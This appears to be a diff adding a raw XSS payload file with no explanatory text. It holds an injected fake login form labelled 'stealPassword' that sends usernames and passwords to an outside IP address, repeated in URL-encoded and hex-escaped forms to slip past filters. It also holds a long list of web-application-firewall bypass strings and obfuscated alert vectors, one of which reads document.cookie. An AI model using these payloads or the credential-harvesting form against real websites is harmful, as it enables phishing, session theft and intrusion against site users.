@@ -1,0 +1,61 @@
+<img src=x onerror="hacked()">
+<script>
+  function hacked(){
+    var name = document.getElementsByName("q")[0].value;
+    var pass = document.getElementsByName("p")[0].value;
+    document.write("Name = "+ name + pass);
+  }
+</script>
+
+
+
+<div id="stealPassword">Please Login:<form name="input" action="http://192.168.106.131/test/index.php" method="get">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><input type="submit" value="Login" /></form></div>
+
+
+%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2F192.168.106.131%2Ftest%2Findex.php%22+method%3D%22get%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
+
+<script+type="text/javascript">document.write('\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x73\x74\x65\x61\x6C\x50\x61\x73\x73\x77\x6F\x72\x64\x22\x3E\x50\x6C\x65\x61\x73\x65\x20\x4C\x6F\x67\x69\x6E\x3A\x3C\x66\x6F\x72\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x69\x6E\x70\x75\x74\x22\x20\x61\x63\x74\x69\x6F\x6E\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x32\x2E\x31\x36\x38\x2E\x31\x30\x36\x2E\x31\x33\x31\x2F\x74\x65\x73\x74\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x22\x20\x6D\x65\x74\x68\x6F\x64\x3D\x22\x67\x65\x74\x22\x3E\x55\x73\x65\x72\x6E\x61\x6D\x65\x3A\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x75\x73\x65\x72\x6E\x61\x6D\x65\x22\x20\x2F\x3E\x3C\x62\x72\x2F\x3E\x50\x61\x73\x73\x77\x6F\x72\x64\x3A\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x2F\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x73\x75\x62\x6D\x69\x74\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x4C\x6F\x67\x69\x6E\x22\x20\x2F\x3E\x3C\x2F\x66\x6F\x72\x6D\x3E\x3C\x2F\x64\x69\x76\x3E\x0A');</script>
+
+
+
+WAF ByPass Strings for XSS.
+
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(1)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/xss/))}//<style></style>
+On Mouse Over​
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+
+Filter Bypass Alert Obfuscation
+
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
